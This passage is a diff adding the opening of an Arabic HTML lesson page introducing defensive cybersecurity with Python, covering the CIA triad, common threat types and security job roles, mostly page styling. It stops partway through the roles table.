@@ -1,0 +1,2009 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>الدرس 1: مدخل إلى الأمن السيبراني بـ Python | CodeWay</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --gold: #ffd700;
+            --gold-soft: #d4af37;
+            --bg: #000;
+            --card: #101010;
+            --card-soft: #161616;
+            --text: #fff;
+            --text-light: #d8d8d8;
+            --text-muted: #a0a0a0;
+            --success: #4CAF50;
+            --info: #2196F3;
+            --warning: #FF9800;
+            --danger: #f44336;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: "Cairo", sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.9;
+            overflow-x: hidden;
+        }
+
+        /* ===== شريط التنقل ===== */
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(5, 5, 5, 0.96);
+            backdrop-filter: blur(12px);
+            padding: 14px 30px;
+            border-bottom: 1px solid rgba(255, 215, 0, 0.15);
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            font-weight: 800;
+            letter-spacing: 1px;
+            color: var(--gold);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.05em;
+        }
+
+        .logo i { font-size: 1.2rem; }
+
+        .breadcrumb {
+            font-size: 0.85em;
+            color: #ccc;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .breadcrumb a {
+            color: var(--gold);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .breadcrumb a:hover { color: #fff; }
+        .breadcrumb span.sep { margin: 0 6px; color: #666; }
+
+        /* ===== هيدر الدرس ===== */
+        .page-hero {
+            padding: 130px 30px 55px;
+            background: radial-gradient(circle at top, #1f1f1f 0%, #000 70%);
+            position: relative;
+            overflow: hidden;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .page-hero::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(255,215,0,0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,215,0,0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+            opacity: 0.4;
+        }
+
+        .page-hero-inner {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+
+        .lesson-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 14px;
+            border-radius: 20px;
+            background: rgba(255, 215, 0, 0.08);
+            border: 1px solid rgba(255, 215, 0, 0.5);
+            font-size: 0.8em;
+            color: var(--gold);
+            margin-bottom: 14px;
+        }
+
+        .lesson-title {
+            margin: 0 0 14px;
+            font-size: 2.3em;
+            color: var(--gold);
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.25);
+            line-height: 1.4;
+        }
+
+        .lesson-intro {
+            font-size: 1.02em;
+            color: var(--text-light);
+            max-width: 780px;
+            margin: 0 auto 22px;
+        }
+
+        .lesson-meta {
+            font-size: 0.9em;
+            color: #ccc;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .lesson-meta-item {
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 999px;
+            padding: 6px 14px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* ===== الحاوية ===== */
+        .container {
+            width: 100%;
+            max-width: 1250px;
+            margin: 0 auto;
+            padding: 35px 30px 70px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        /* ===== فهرس ===== */
+        .toc-bar {
+            background: linear-gradient(135deg, #121212 0%, #0a0a0a 100%);
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            border-radius: 14px;
+            padding: 20px 24px;
+        }
+
+        .toc-bar h3 {
+            color: var(--gold);
+            font-size: 1.02em;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc-links { display: flex; flex-wrap: wrap; gap: 8px; }
+
+        .toc-links a {
+            color: var(--text-light);
+            text-decoration: none;
+            font-size: 0.86em;
+            padding: 8px 16px;
+            border-radius: 999px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            transition: all 0.25s;
+        }
+
+        .toc-links a:hover {
+            color: var(--gold);
+            background: rgba(255,215,0,0.08);
+            border-color: rgba(255,215,0,0.5);
+            transform: translateY(-2px);
+        }
+
+        /* ===== بطاقات الأقسام ===== */
+        .section-card {
+            background: var(--card);
+            border-radius: 16px;
+            padding: 32px 40px 34px;
+            border: 1px solid rgba(255, 255, 255, 0.09);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.35);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .section-card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--gold-soft), var(--gold));
+            opacity: 0.7;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.5em;
+            color: var(--gold);
+            margin-bottom: 18px;
+            padding-bottom: 14px;
+            border-bottom: 1px dashed rgba(255, 215, 0, 0.2);
+        }
+
+        .section-title .num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid var(--gold);
+            font-size: 0.85em;
+            color: var(--gold);
+            flex-shrink: 0;
+        }
+
+        .section-title i { font-size: 1.1rem; color: var(--gold); }
+
+        .section-card p {
+            font-size: 1em;
+            color: var(--text-light);
+            margin: 10px 0;
+        }
+
+        .section-card strong { color: var(--gold); }
+
+        .sub-title {
+            color: var(--gold-soft);
+            font-size: 1.15em;
+            margin: 22px 0 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .sub-title i { color: var(--gold); font-size: 0.95em; }
+
+        /* ===== قوائم ===== */
+        .list { list-style: none; padding: 0; margin: 14px 0; }
+
+        .list li {
+            position: relative;
+            padding: 10px 34px 10px 16px;
+            margin-bottom: 8px;
+            background: var(--card-soft);
+            border-radius: 9px;
+            border: 1px solid rgba(255,255,255,0.06);
+            font-size: 0.96em;
+            color: var(--text-light);
+        }
+
+        .list li::before {
+            content: "\f0da";
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--gold);
+            font-size: 0.75em;
+        }
+
+        /* ===== كتل الكود ===== */
+        .code-block {
+            margin: 16px 0;
+            background: #050505;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            overflow: hidden;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 16px;
+            background: #0d0d0d;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            font-size: 0.8em;
+            color: #aaa;
+        }
+
+        .code-header .lang {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--gold);
+        }
+
+        pre {
+            margin: 0;
+            padding: 20px;
+            overflow-x: auto;
+            font-family: Consolas, "Courier New", monospace;
+            font-size: 0.94em;
+            direction: ltr;
+            text-align: left;
+            color: #f5f5f5;
+            line-height: 1.7;
+        }
+
+        pre .kw { color: #ff79c6; }
+        pre .fn { color: #8be9fd; }
+        pre .str { color: #f1fa8c; }
+        pre .cm { color: #6272a4; font-style: italic; }
+        pre .num { color: #bd93f9; }
+
+        /* ===== مخرجات ===== */
+        .output-block {
+            margin: 12px 0 16px;
+            background: #0d1117;
+            border-radius: 10px;
+            border: 1px solid rgba(76, 175, 80, 0.25);
+            overflow: hidden;
+        }
+
+        .output-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(76, 175, 80, 0.08);
+            border-bottom: 1px solid rgba(76, 175, 80, 0.2);
+            font-size: 0.8em;
+            color: var(--success);
+            font-weight: 700;
+        }
+
+        .output-block pre {
+            padding: 16px 20px;
+            color: #c8e6c9;
+            font-size: 0.92em;
+        }
+
+        /* ===== تنبيهات ===== */
+        .alert {
+            margin: 16px 0;
+            padding: 15px 20px;
+            border-radius: 10px;
+            font-size: 0.94em;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            line-height: 1.85;
+        }
+
+        .alert i { margin-top: 6px; font-size: 1.1em; flex-shrink: 0; }
+
+        .alert-info {
+            background: rgba(33, 150, 243, 0.08);
+            border-right: 4px solid var(--info);
+            color: #bbdefb;
+        }
+        .alert-info i { color: var(--info); }
+
+        .alert-tip {
+            background: rgba(76, 175, 80, 0.08);
+            border-right: 4px solid var(--success);
+            color: #c8e6c9;
+        }
+        .alert-tip i { color: var(--success); }
+
+        .alert-warn {
+            background: rgba(255, 152, 0, 0.08);
+            border-right: 4px solid var(--warning);
+            color: #ffe0b2;
+        }
+        .alert-warn i { color: var(--warning); }
+
+        /* ===== جدول ===== */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 16px 0;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.08);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.94em;
+        }
+
+        th, td {
+            padding: 14px 18px;
+            text-align: right;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+
+        th {
+            background: #141414;
+            color: var(--gold);
+            font-weight: 700;
+            font-size: 0.97em;
+        }
+
+        td { color: var(--text-light); }
+
+        tr:last-child td { border-bottom: none; }
+        tbody tr:hover { background: rgba(255,215,0,0.03); }
+
+        code {
+            background: rgba(255,215,0,0.08);
+            color: var(--gold);
+            padding: 2px 8px;
+            border-radius: 5px;
+            font-family: Consolas, monospace;
+            font-size: 0.92em;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        /* ===== بطاقات أنواع الدوال ===== */
+        .function-types {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 16px;
+            margin: 20px 0;
+        }
+
+        .function-card {
+            background: var(--card-soft);
+            border-radius: 12px;
+            padding: 20px 22px;
+            border: 1px solid rgba(255,255,255,0.08);
+            border-top: 4px solid var(--gold);
+            transition: all 0.3s;
+        }
+
+        .function-card:hover {
+            transform: translateY(-4px);
+            border-top-color: var(--gold-soft);
+            box-shadow: 0 10px 25px rgba(255,215,0,0.1);
+        }
+
+        .function-card h4 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--gold);
+            margin-bottom: 10px;
+            font-size: 1.05em;
+        }
+
+        .function-card h4 i { font-size: 1.15em; }
+
+        .function-card p {
+            font-size: 0.93em;
+            color: var(--text-light);
+            margin: 0;
+        }
+
+        /* ===== صناديق ملاحظة ===== */
+        .note-box {
+            background: var(--card-soft);
+            border-radius: 12px;
+            padding: 18px 22px;
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            margin: 16px 0;
+        }
+
+        .note-box strong {
+            color: var(--gold);
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.02em;
+        }
+
+        .note-box ul { list-style: none; padding: 0; margin: 0; }
+
+        .note-box li {
+            padding: 8px 0;
+            font-size: 0.95em;
+            color: var(--text-light);
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .note-box li:last-child { border-bottom: none; }
+
+        .note-box li i { color: var(--gold); margin-top: 7px; flex-shrink: 0; }
+
+        /* ===== التمارين ===== */
+        .exercise-block {
+            margin-top: 18px;
+            background: linear-gradient(135deg, #141414 0%, #0a0a0a 100%);
+            border-radius: 14px;
+            padding: 24px 26px;
+            border: 1px solid rgba(255, 215, 0, 0.35);
+            position: relative;
+        }
+
+        .exercise-block::before {
+            content: "";
+            position: absolute;
+            top: -1px;
+            right: 24px;
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--gold-soft), var(--gold));
+            border-radius: 0 0 4px 4px;
+        }
+
+        .exercise-head {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 14px;
+            flex-wrap: wrap;
+        }
+
+        .exercise-num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            background: rgba(255, 215, 0, 0.12);
+            border: 1px solid var(--gold);
+            color: var(--gold);
+            font-size: 0.9em;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .exercise-head h4 {
+            color: var(--gold);
+            font-size: 1.1em;
+            margin: 0;
+            flex: 1;
+        }
+
+        .exercise-tag {
+            font-size: 0.72em;
+            padding: 4px 10px;
+            border-radius: 999px;
+            background: rgba(255,215,0,0.1);
+            border: 1px solid rgba(255,215,0,0.4);
+            color: var(--gold);
+        }
+
+        .exercise-question {
+            color: var(--text-light);
+            font-size: 0.98em;
+            margin-bottom: 14px;
+            line-height: 1.85;
+        }
+
+        .options-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 14px;
+        }
+
+        .option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 11px 15px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 9px;
+            cursor: pointer;
+            transition: all 0.25s;
+            font-size: 0.95em;
+        }
+
+        .option:hover {
+            background: rgba(255, 215, 0, 0.05);
+            border-color: rgba(255, 215, 0, 0.35);
+        }
+
+        .option input {
+            accent-color: var(--gold);
+            transform: scale(1.2);
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .option.correct {
+            background: rgba(76, 175, 80, 0.12);
+            border-color: var(--success);
+        }
+
+        .option.wrong {
+            background: rgba(244, 67, 54, 0.1);
+            border-color: var(--danger);
+        }
+
+        /* صح/خطأ */
+        .tf-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+
+        .tf-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 16px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 9px;
+            flex-wrap: wrap;
+        }
+
+        .tf-statement {
+            font-size: 0.95em;
+            color: var(--text-light);
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .tf-actions { display: flex; gap: 8px; flex-shrink: 0; }
+
+        .tf-btn {
+            padding: 6px 14px;
+            border-radius: 7px;
+            border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(255,255,255,0.04);
+            color: var(--text);
+            font-family: "Cairo", sans-serif;
+            font-size: 0.85em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+
+        .tf-btn:hover { border-color: var(--gold); color: var(--gold); }
+
+        .tf-btn.selected {
+            background: rgba(255,215,0,0.15);
+            border-color: var(--gold);
+            color: var(--gold);
+        }
+
+        .tf-item.correct {
+            background: rgba(76, 175, 80, 0.1);
+            border-color: var(--success);
+        }
+
+        .tf-item.wrong {
+            background: rgba(244, 67, 54, 0.1);
+            border-color: var(--danger);
+        }
+
+        /* أكمل الكود */
+        .code-fill {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 18px 20px;
+            background: #050505;
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.12);
+            font-family: Consolas, monospace;
+            direction: ltr;
+            font-size: 0.95em;
+            margin-bottom: 14px;
+            color: #f5f5f5;
+            line-height: 2.3;
+        }
+
+        .code-fill .line {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .code-fill .cm { color: #6272a4; font-style: italic; }
+        .code-fill .str { color: #f1fa8c; }
+        .code-fill .fn { color: #8be9fd; }
+        .code-fill .kw { color: #ff79c6; }
+
+        .blank-input {
+            background: rgba(255,215,0,0.08);
+            border: 2px dashed var(--gold);
+            border-radius: 6px;
+            padding: 4px 10px;
+            color: var(--gold);
+            font-family: Consolas, monospace;
+            font-size: 0.95em;
+            min-width: 100px;
+            width: auto;
+            text-align: center;
+            outline: none;
+            transition: all 0.25s;
+        }
+
+        .blank-input:focus {
+            background: rgba(255,215,0,0.15);
+            border-style: solid;
+        }
+
+        .blank-input.correct {
+            background: rgba(76, 175, 80, 0.15);
+            border-color: var(--success);
+            color: #a5d6a7;
+        }
+
+        .blank-input.wrong {
+            background: rgba(244, 67, 54, 0.12);
+            border-color: var(--danger);
+            color: #ef9a9a;
+        }
+
+        /* ترتيب الكود */
+        .sortable-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-bottom: 14px;
+        }
+
+        .sortable-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 14px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 9px;
+            font-family: Consolas, monospace;
+            font-size: 0.92em;
+            direction: ltr;
+            text-align: left;
+            cursor: default;
+        }
+
+        .sortable-item .order-num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: rgba(255,215,0,0.12);
+            border: 1px solid var(--gold);
+            color: var(--gold);
+            font-family: "Cairo", sans-serif;
+            font-size: 0.8em;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .sortable-item.correct {
+            background: rgba(76, 175, 80, 0.1);
+            border-color: var(--success);
+        }
+
+        .sortable-item.wrong {
+            background: rgba(244, 67, 54, 0.1);
+            border-color: var(--danger);
+        }
+
+        .sort-arrows { display: flex; gap: 6px; }
+
+        .sort-btn {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.15);
+            background: rgba(255,255,255,0.04);
+            color: var(--text-light);
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.25s;
+        }
+
+        .sort-btn:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+        }
+
+        /* أزرار التمرين */
+        .exercise-actions { display: flex; gap: 10px; flex-wrap: wrap; }
+
+        .btn {
+            padding: 10px 22px;
+            border-radius: 8px;
+            border: none;
+            font-family: "Cairo", sans-serif;
+            font-weight: 600;
+            font-size: 0.9em;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, var(--gold-soft), var(--gold));
+            color: #000;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 18px rgba(212, 175, 55, 0.4);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.08);
+            color: var(--text);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.15); }
+
+        .result-msg {
+            margin-top: 14px;
+            padding: 12px 16px;
+            border-radius: 9px;
+            font-size: 0.93em;
+            display: none;
+        }
+
+        .result-msg.show { display: block; }
+        .result-msg.ok {
+            background: rgba(76, 175, 80, 0.15);
+            border-right: 4px solid var(--success);
+            color: #c8e6c9;
+        }
+        .result-msg.mid {
+            background: rgba(255, 152, 0, 0.15);
+            border-right: 4px solid var(--warning);
+            color: #ffe0b2;
+        }
+        .result-msg.bad {
+            background: rgba(244, 67, 54, 0.12);
+            border-right: 4px solid var(--danger);
+            color: #ef9a9a;
+        }
+
+        /* ===== التنقل ===== */
+        .nav-links {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            margin-top: 10px;
+        }
+
+        .nav-link {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--gold);
+            text-decoration: none;
+            padding: 18px 22px;
+            border-radius: 12px;
+            background: rgba(255, 215, 0, 0.05);
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            transition: all 0.3s;
+            font-size: 0.94em;
+        }
+
+        .nav-link:hover {
+            background: rgba(255, 215, 0, 0.12);
+            border-color: var(--gold);
+            color: #fff;
+            transform: translateY(-3px);
+        }
+
+        .nav-link.next { justify-content: flex-end; text-align: left; }
+
+        /* ===== شريط التقدم ===== */
+        .progress-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px dashed rgba(255,215,0,0.2);
+        }
+
+        .progress-section h4 {
+            color: var(--gold);
+            font-size: 1.02em;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .progress-bar {
+            height: 9px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--gold-soft), var(--gold));
+            width: 0%;
+            transition: width 1s ease;
+        }
+
+        .progress-text {
+            font-size: 0.87em;
+            color: var(--text-muted);
+            text-align: center;
+        }
+
+        /* ===== الفوتر ===== */
+        footer {
+            text-align: center;
+            padding: 25px;
+            background: #050505;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.87em;
+            color: var(--text-muted);
+        }
+
+        /* ===== تجاوب ===== */
+        @media (max-width: 800px) {
+            .navbar {
+                flex-direction: column;
+                gap: 8px;
+                padding: 10px 15px;
+            }
+            .page-hero { padding: 150px 20px 40px; }
+            .lesson-title { font-size: 1.7em; }
+            .container { padding: 25px 18px 55px; }
+            .section-card { padding: 24px 20px; }
+            .section-title { font-size: 1.2em; }
+            .nav-links { grid-template-columns: 1fr; }
+            .tf-item { flex-direction: column; align-items: stretch; }
+            .tf-actions { justify-content: flex-end; }
+            .function-types { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 500px) {
+            .lesson-title { font-size: 1.4em; }
+        }
+
+        /* ===== المختبر التفاعلي ===== */
+        .lab {
+            margin-top: 18px;
+            background: linear-gradient(135deg, #101820 0%, #0a0a0a 100%);
+            border-radius: 14px;
+            padding: 22px 24px;
+            border: 1px solid rgba(33, 150, 243, 0.35);
+        }
+        .lab-head {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #90caf9;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .lab-row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .lab-row label { color: var(--text-light); font-size: 0.92em; }
+        .lab-input, .lab-select {
+            background: #050505;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            padding: 8px 12px;
+            color: var(--text);
+            font-family: Consolas, "Cairo", monospace;
+            font-size: 0.95em;
+            min-width: 120px;
+            outline: none;
+        }
+        .lab-input:focus, .lab-select:focus { border-color: var(--gold); }
+        .lab-console {
+            margin-top: 12px;
+            background: #0d1117;
+            border-radius: 10px;
+            border: 1px solid rgba(76, 175, 80, 0.25);
+            min-height: 60px;
+            padding: 14px 18px;
+            font-family: Consolas, monospace;
+            direction: ltr;
+            text-align: left;
+            color: #c8e6c9;
+            white-space: pre-wrap;
+            font-size: 0.92em;
+            line-height: 1.8;
+        }
+        .lab-console .err { color: #ef9a9a; }
+        .lab-console .prompt { color: var(--gold); }
+        .output-block pre.err-out { color: #ef9a9a; }
+        .figure-block {
+            margin: 12px 0 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(76, 175, 80, 0.25);
+            overflow: hidden;
+            background: #0d1117;
+        }
+        .figure-block .output-header { border-bottom: 1px solid rgba(76, 175, 80, 0.2); }
+        .figure-block img {
+            display: block;
+            max-width: 100%;
+            height: auto;
+            margin: 12px auto;
+            background: #fff;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== شريط التنقل ===== -->
+<nav class="navbar">
+    <div class="logo">
+        <i class="fas fa-code"></i>
+        <span>CodeWay · Python</span>
+    </div>
+    <div class="breadcrumb">
+        <a href="../../../index.html">مسار بايثون</a>
+        <span class="sep">/</span>
+        <a href="../index.html">تخصص الأمن السيبراني</a>
+        <span class="sep">/</span>
+        <span>مدخل إلى الأمن</span>
+    </div>
+</nav>
+
+<!-- ===== هيدر الدرس ===== -->
+<section class="page-hero">
+    <div class="page-hero-inner">
+        <div class="lesson-badge">
+            <i class="fas fa-shield-alt"></i>
+            الدرس 1 · الأساسيات
+        </div>
+        <h1 class="lesson-title">مدخل إلى الأمن السيبراني بـ Python</h1>
+        <p class="lesson-intro">
+            الأمن السيبراني ليس «اختراقًا» كما في الأفلام، بل حماية المعلومات والأنظمة من أن تُسرق أو تُعدَّل أو تتعطل. في هذا الدرس ستتعلم <strong>ثالوث الأمن (CIA)</strong> وأشهر <strong>التهديدات</strong> وأدوار العاملين في المجال، ثم <strong>الأخلاقيات والقانون</strong> التي تحكم كل ما ستفعله في هذا التخصص، ولماذا <strong>بايثون</strong> أداة المحلل الأمني المفضلة. وتكتب أول أدواتك الدفاعية: <strong>مراقب سلامة الملفات</strong>، وتكتشف لماذا لا يصلح <code>random</code> للأسرار، وتقيّم المخاطر بطريقة يستخدمها المحترفون.
+        </p>
+        <div class="lesson-meta">
+            <div class="lesson-meta-item"><i class="fas fa-clock"></i> ⏱ 60 دقيقة</div>
+            <div class="lesson-meta-item"><i class="fas fa-bullseye"></i> 🎯 عقلية المدافع</div>
+            <div class="lesson-meta-item"><i class="fas fa-layer-group"></i> 🧱 تخصص</div>
+            <div class="lesson-meta-item"><i class="fas fa-check-circle"></i> بداية التخصص</div>
+        </div>
+    </div>
+</section>
+
+<!-- ===== المحتوى ===== -->
+<main class="container">
+
+    <!-- فهرس -->
+    <div class="toc-bar">
+        <h3><i class="fas fa-list"></i> محتويات الدرس</h3>
+        <div class="toc-links">
+            <a href="#what">1. ما هو الأمن؟</a>
+            <a href="#ethics">2. الأخلاقيات والقانون</a>
+            <a href="#python">3. لماذا Python؟</a>
+            <a href="#integrity">4. سلامة الملفات</a>
+            <a href="#random">5. secrets مقابل random</a>
+            <a href="#risk">6. تقييم المخاطر</a>
+            <a href="#mindset">7. مبادئ الدفاع</a>
+            <a href="#exercises">8. تمارين تفاعلية</a>
+            <a href="#summary">9. الخلاصة</a>
+        </div>
+    </div>
+
+<section class="section-card" id="what">
+    <h2 class="section-title">
+        <span class="num">1</span>
+        <i class="fas fa-shield-alt"></i>
+        ما هو الأمن السيبراني؟
+    </h2>
+        <p>
+            كل نظام يحمي شيئًا ثمينًا: بيانات عملاء، أو أموالًا، أو خدمة يعتمد عليها الناس. والأمن السيبراني يقيس الحماية بثلاث خصائص
+            تسمى <strong>ثالوث CIA</strong> — وأي هجوم في العالم يستهدف واحدة منها على الأقل:
+        </p>
+        <div class="function-types">
+            <div class="function-card">
+                <h4><i class="fas fa-user-secret"></i> السرية (Confidentiality)</h4>
+                <p>لا يطّلع على المعلومة إلا المصرّح لهم. يُكسر عند تسريب قاعدة بيانات أو التنصت على اتصال غير مشفر.</p>
+            </div>
+            <div class="function-card">
+                <h4><i class="fas fa-check-double"></i> السلامة (Integrity)</h4>
+                <p>المعلومة لم تُعدَّل دون إذن. يُكسر عند تغيير مبلغ تحويل، أو زرع كود خبيث في ملف على الخادم.</p>
+            </div>
+            <div class="function-card">
+                <h4><i class="fas fa-server"></i> التوافر (Availability)</h4>
+                <p>النظام يعمل حين نحتاجه. يُكسر بهجوم حجب الخدمة (DoS) أو برنامج فدية يشفّر الملفات.</p>
+            </div>
+        </div>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>التهديد</th><th>ماذا يحدث</th><th>يستهدف</th><th>سنتعامل معه في</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>التصيد (Phishing)</td><td>رسالة مزيفة تسرق كلمة المرور</td><td>السرية</td><td>الدرس 8</td></tr>
+                    <tr><td>تخمين كلمات المرور (Brute force)</td><td>آلاف المحاولات على صفحة الدخول</td><td>السرية</td><td>الدرسان 5 و 8</td></tr>
+                    <tr><td>الحقن (SQL Injection)</td><td>مدخلات تغيّر معنى استعلام قاعدة البيانات</td><td>السرية والسلامة</td><td>الدرس 7</td></tr>
+                    <tr><td>البرمجيات الخبيثة</td><td>برنامج يتجسس أو يشفّر الملفات أو يتحكم بالجهاز</td><td>الثلاثة</td><td>الدرس 1 (سلامة الملفات)</td></tr>
+                    <tr><td>حجب الخدمة (DoS)</td><td>إغراق الخادم بالطلبات حتى يتوقف</td><td>التوافر</td><td>الدرسان 5 و 6 (الكشف)</td></tr>
+                    <tr><td>التهديد الداخلي</td><td>موظف يسيء استخدام صلاحياته</td><td>الثلاثة</td><td>الدرس 5 (السجلات)</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="table-wrap">
+            <table>
+                <thead>
+                    <tr><th>الدور</th><th>ماذا يفعل</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>محلل مركز عمليات الأمن (SOC Analyst)</td><td>يراقب السجلات والتنبيهات ويحقق في الحوادث — الفريق الأزرق (المدافع)</td></tr>
+                    <tr><td>مختبر الاختراق (Penetration Tester)</td><td>يهاجم الأنظمة <strong>بتصريح مكتوب</strong> ليكتشف الثغرات قبل المهاجمين — الفريق الأحمر</td></tr>
+                    <tr><td>مهندس أمن التطبيقات</td><td>يراجع الكود ويصمم الحماية داخل التطبيقات</td></tr>
+                    <tr><td>محلل الأدلة الرقمية (Forensics)</td><td>يحلل ما حدث بعد الحادثة ويحفظ الأدلة</td></tr>
